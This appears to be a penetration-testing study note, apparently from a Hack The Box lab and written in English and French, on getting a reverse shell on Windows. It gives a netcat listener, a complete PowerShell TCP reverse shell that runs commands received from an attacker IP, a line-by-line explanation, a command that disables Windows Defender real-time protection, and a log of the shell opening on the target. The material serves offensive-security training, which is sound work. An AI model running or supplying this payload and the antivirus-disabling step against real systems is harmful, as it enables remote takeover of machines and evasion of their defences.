# Reverse Shells ( Windows)

***

With a `reverse shell`, the attack box will have a listener running, and the target will need to initiate the connection.

<mark style="color:orange;">**Reverse Shell Example**</mark>

![image](https://academy.hackthebox.com/storage/modules/115/reverseshell.png)

[Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)&#x20;

***

### <mark style="color:red;">Hands-on With A Simple Reverse Shell in Windows</mark>

<mark style="color:green;">**Server (**</mark><mark style="color:green;">**`attack box`**</mark><mark style="color:green;">**)**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

{% hint style="warning" %}
Cette fois-ci, avec notre écouteur, nous le lions à un port commun (443), un port généralement utilisé pour les connexions HTTPS. Nous pouvons vouloir utiliser des ports communs comme celui-ci, car lorsque nous initions la connexion vers notre écouteur, nous voulons nous assurer qu'il ne soit pas bloqué en sortie par le pare-feu du système d'exploitation et au niveau du réseau. Il serait rare de voir une équipe de sécurité bloquer le port 443 en sortie, car de nombreuses applications et organisations dépendent de HTTPS pour accéder à divers sites web pendant la journée de travail.

Cela dit, un pare-feu capable d'inspection approfondie des paquets (Deep Packet Inspection) et de visibilité au niveau de la couche 7 pourrait être capable de détecter et d'arrêter un reverse shell sortant sur un port commun, car il examine le contenu des paquets réseau, et pas seulement l'adresse IP et le port.&#x20;
{% endhint %}

<mark style="color:green;">**Client (target)**</mark>

{% code overflow="wrap" fullWidth="true" %}
```powershell
# L'option `-nop` désactive la protection des politiques d'exécution (no profile)
# L'option `-c` indique que le reste de la commande est du code à exécuter
powershell -nop -c "
    # Création d'un objet TCPClient pour se connecter à l'adresse 10.10.14.158 sur le port 443
    $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158', 443);

    # Obtention du flux de données du client pour lire et écrire
    $stream = $client.GetStream();

    # Déclaration d'un tableau de bytes (octets) pour stocker les données reçues
    [byte[]]$bytes = 0..65535 | % { 0 };

    # Boucle pour lire les données envoyées par le flux tant qu'il y a des données (tant que $i est différent de 0)
    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        # Conversion des données reçues en chaîne de caractères ASCII
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);

        # Exécution du code reçu avec la commande `iex` et capture de la sortie (y compris les erreurs)
        $sendback = (iex $data 2>&1 | Out-String);

        # Ajout de l'invite de commande PowerShell avec le chemin courant à la sortie
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';

        # Conversion de la chaîne de sortie en tableau de bytes
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);

        # Envoi des données transformées au flux de sortie
        $stream.Write($sendbyte, 0, $sendbyte.Length);

        # Vidage du flux de sortie pour s'assurer que les données sont bien envoyées
        $stream.Flush();
    }

    # Fermeture de la connexion une fois la boucle terminée
    $client.Close();
"

```
{% endcode %}

{% hint style="warning" %}
1\. **`-nop -c`**

* **`-nop`** : Cet argument désactive l'obfuscation du code PowerShell et ne précharge pas le profil utilisateur, rendant l'exécution plus légère et potentiellement moins détectable.
* **`-c`** : Abréviation de `-Command`. Il permet d'exécuter directement la chaîne de commande PowerShell suivante.

#### 2. **`$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158', 443)`**

* **`$client`** : Cette variable représente un objet TCPClient, qui est utilisé pour établir une connexion réseau TCP.
* **`New-Object System.Net.Sockets.TCPClient`** : Cette commande crée une nouvelle instance de la classe `TCPClient` pour ouvrir une connexion TCP.
* **`'10.10.14.158', 443`** : Ce sont l'adresse IP de l'attaquant (10.10.14.158) et le port (443) sur lesquels la machine compromise va se connecter.
* **But** : Cette ligne établit une connexion à la machine de l'attaquant.

#### 3. **`$stream = $client.GetStream()`**

* **`$stream`** : Cette variable représente le flux de données (stream) associé à la connexion TCP.
* **`$client.GetStream()`** : Cela obtient le flux réseau à partir de l'objet `$client`, permettant d'envoyer et recevoir des données via la connexion TCP.
* **But** : Le flux est l'endroit où les commandes et les réponses seront échangées entre la machine compromise et l'attaquant.

#### 4. **`[byte[]]$bytes = 0..65535|%{0}`**

* **`[byte[]]`** : Cela définit un tableau de type `byte[]` (un tableau d'octets) pour stocker les données qui seront lues depuis le flux réseau.
* **`0..65535`** : Cela génère une plage de nombres allant de 0 à 65535 (correspondant à la taille maximale d'une trame de données).
* **`%{0}`** : Pour chaque élément de cette plage, il remplit le tableau avec des zéros.
* **But** : Cette ligne initialise un tableau d'octets de taille 65536 pour recevoir les données à partir du flux.

#### 5. **`while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)`**

* **`$i = $stream.Read($bytes, 0, $bytes.Length)`** : Cette méthode lit les données depuis le flux réseau et les stocke dans le tableau `$bytes`. Elle renvoie le nombre d'octets lus, et cela est assigné à `$i`.
* **`while(... -ne 0)`** : Cette boucle `while` continue tant que le nombre d'octets lus n'est pas égal à 0. Si `$i` est 0, cela signifie que la connexion est terminée.
* **But** : Tant qu'il y a des données à lire depuis la connexion réseau, la boucle se répète.

#### 6. **`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)`**

* **`New-Object -TypeName System.Text.ASCIIEncoding`** : Cela crée un nouvel objet pour l'encodage de texte en ASCII.
* **`.GetString($bytes, 0, $i)`** : Cette méthode convertit les octets lus en une chaîne de caractères ASCII, en prenant `$i` octets à partir de l'index 0.
* **But** : La donnée brute lue du flux réseau est convertie en texte compréhensible (ASCII), qui représente la commande envoyée par l'attaquant.

#### 7. **`$sendback = (iex $data 2>&1 | Out-String)`**

* **`iex $data`** : La commande `iex` exécute dynamiquement la chaîne de commande contenue dans `$data`. Cela permet d'exécuter les commandes envoyées par l'attaquant.
* **`2>&1`** : Cette redirection envoie les messages d'erreurs vers la sortie standard, ce qui permet de capturer les erreurs dans la réponse.
* **`| Out-String`** : Cela convertit la sortie en une chaîne de caractères.
* **But** : Cette ligne exécute la commande envoyée et capture la sortie (ou les erreurs) dans une variable `$sendback`.

#### 8. **`$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '`**

* **`$sendback2`** : Cette variable combine la sortie de la commande exécutée avec une invite de commande de type PowerShell (`PS <path> >`), où `<path>` est le chemin actuel (`pwd` signifie "print working directory").
* **But** : Cela prépare une chaîne à envoyer de retour à l'attaquant, comprenant la sortie de la commande suivie de l'invite PowerShell, pour indiquer que le shell est prêt à recevoir une nouvelle commande.

#### 9. **`$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)`**

* **`[text.encoding]::ASCII`** : Cette syntaxe appelle l'encodage ASCII en utilisant .NET.
* **`.GetBytes($sendback2)`** : Cette méthode convertit la chaîne `$sendback2` en un tableau d'octets (byte array), pour que les données puissent être envoyées via le flux réseau.
* **But** : La sortie est convertie en octets pour être envoyée via la connexion TCP.

#### 10. **`$stream.Write($sendbyte, 0, $sendbyte.Length)`**

* **`$stream.Write`** : Cette méthode envoie les octets via le flux réseau vers l'attaquant.
* **But** : La sortie de la commande est envoyée à l'attaquant.

#### 11. **`$stream.Flush()`**

* **`$stream.Flush()`** : Cette méthode vide le flux, garantissant que toutes les données en attente sont envoyées immédiatement.
* **But** : S'assure que les octets écrits sont réellement envoyés sans délai.

#### 12. **`$client.Close()`**

* **`$client.Close()`** : Cette commande ferme la connexion TCP lorsque la boucle `while` se termine (c'est-à-dire que la connexion a été fermée par l'attaquant ou la machine cible).
* **But** : Terminer proprement la connexion une fois toutes les données échangées.
{% endhint %}

`What happened when we hit enter in command prompt?`

<mark style="color:green;">**Client (target)**</mark>

{% code fullWidth="true" %}
```cmd-session
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```
{% endcode %}

The `Windows Defender antivirus` (`AV`) software stopped the execution of the code. This is working exactly as intended, and from a `defensive` perspective, this is a `win`. From an offensive standpoint, there are some obstacles to overcome if AV is enabled on a system we are trying to connect with. For our purposes, we will want to disable the antivirus through the `Virus & threat protection settings` or by using this command in an administrative PowerShell console (right-click, run as admin):

<mark style="color:green;">**Disable AV**</mark>

```powershell
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

Once AV is disabled, attempt to execute the code again.

<mark style="color:green;">**Server (attack box)**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```
